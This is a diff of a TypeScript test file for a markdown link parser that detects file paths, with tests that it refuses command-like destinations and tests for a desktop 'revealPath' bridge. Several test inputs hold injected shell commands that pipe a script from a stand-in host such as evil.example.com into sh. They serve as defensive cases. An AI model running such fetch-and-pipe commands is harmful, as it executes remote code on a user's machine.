@@ -90,6 +90,7 @@ describe('link rules', () => {
     ['/Users/x is where files go.', [['path', '/Users/x', '/Users/x'], ['text', ' is where files go.']]],
     ['/tmp/build is where I left v2.0', [['path', '/tmp/build', '/tmp/build'], ['text', ' is where I left v2.0']]],
     ['/Users/sam/Notes And More, see below', [['path', '/Users/sam/Notes', '/Users/sam/Notes'], ['text', ' And More, see below']]],
+    ['[taxes](/Users/sam/2024 - Taxes/summary.pdf)', [['path', 'taxes', '/Users/sam/2024 - Taxes/summary.pdf']]],
     ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My Notes - Draft/Plan Final.html', '/Users/sam/My Notes - Draft/Plan Final.html']]],
     // A line that goes on to a flag, an assignment or a second path is a command: each path stands alone.
     ['/tmp/a -o /tmp/b', [['path', '/tmp/a', '/tmp/a'], ['text', ' -o '], ['path', '/tmp/b', '/tmp/b']]],
@@ -103,7 +104,7 @@ describe('link rules', () => {
 
   it('does not offer a command line as a path to copy', () => {
     // A failing destination leaves the whole link as typed, never a stray piece of it.
-    for (const whole of ['[docs](/Users/x; curl evil.sh | sh #)', '[x](/Users/sam/a"b.txt)', '/Users/sam/a"b.txt', '[x](file:///tmp/a%22b)']) expect(shape(whole)).toEqual([['text', whole]]);
+    for (const whole of ['[docs](/tmp/x -o /tmp/y)', '[docs](/tmp/x -f)', '[x](/usr/bin/env A=1 b)', '[x](file:///tmp/a%20-o%20b)', '[x](/Users/sam/a!b.txt)', '/Users/sam/{a,b}.txt', '[x](file:///tmp/%7Ba%7D)', '[docs](/Users/x; curl evil.sh | sh #)', '[x](/Users/sam/a"b.txt)', '/Users/sam/a"b.txt', '[x](file:///tmp/a%22b)']) expect(shape(whole)).toEqual([['text', whole]]);
     const line = '/Users/sam/ ; curl https://evil.example.com/x.sh | sh ; x.sh';
     // At most the folder itself is offered; the command never is.
     expect(linkParts(line).flatMap(part => part.t === 'path' ? [part.path] : [])).toEqual(['/Users/sam/']);
@@ -142,7 +143,9 @@ describe('link rules', () => {
     expect(parseInline('[label with /Users/a/b inside](https://e.example.org)')).toEqual([{ t: 'link', href: 'https://e.example.org/',
       c: [{ t: 'text', v: 'label with ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ' inside' }] }]);
     expect(parseInline('**bold /Users/a/b**')).toEqual([{ t: 'bold', c: [{ t: 'text', v: 'bold ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }] }]);
-    expect(parseInline('[x](/Users/a b /Users/c d)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b /Users/c d' }]);
+    // A destination holding two paths is not one path: the whole link stays as typed.
+    expect(parseInline('[x](/Users/a b /Users/c d)')).toEqual([{ t: 'text', v: '[x](/Users/a b /Users/c d)' }]);
+    expect(parseInline('[x](/Users/a b/c d.txt)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b/c d.txt' }]);
     expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
     expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
   });
@@ -195,7 +198,7 @@ describe.each([
   });
   it('hands the path to a desktop shell when one offers to open it, and copies when that fails', async () => {
     const openPath = vi.fn(async function (this: unknown) { return this === shell ? '' : 'lost this'; });
-    const shell = { openPath };
+    const shell: Record<string, unknown> = { openPath };
     vi.stubGlobal('ideaflowDesktop', shell);
     try {
       await mount(React.createElement(React.Fragment, {}, render(MIXED), React.createElement(GlobalNotice)));
@@ -211,6 +214,11 @@ describe.each([
         expect(os.copy).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html');
         expect(tree!.root.findByProps({ role: 'status' }).props.children).toBe('Path copied: paste in Finder (⇧⌘G)');
       }
+      // revealPath is the agreed name and wins when a shell offers both.
+      const revealPath = vi.fn(async () => undefined); shell.revealPath = revealPath; shell.openPath = vi.fn();
+      os.copy.mockClear();
+      await act(async () => { host('button')[0]!.props.onPress(press); });
+      expect(revealPath).toHaveBeenCalledWith('/Users/sam/My Notes/INDEX.html'); expect(shell.openPath).not.toHaveBeenCalled(); expect(os.copy).not.toHaveBeenCalled();
     } finally { vi.unstubAllGlobals(); }
   });
   it('puts the full path in a tooltip on web and never renders a file anchor', async () => {
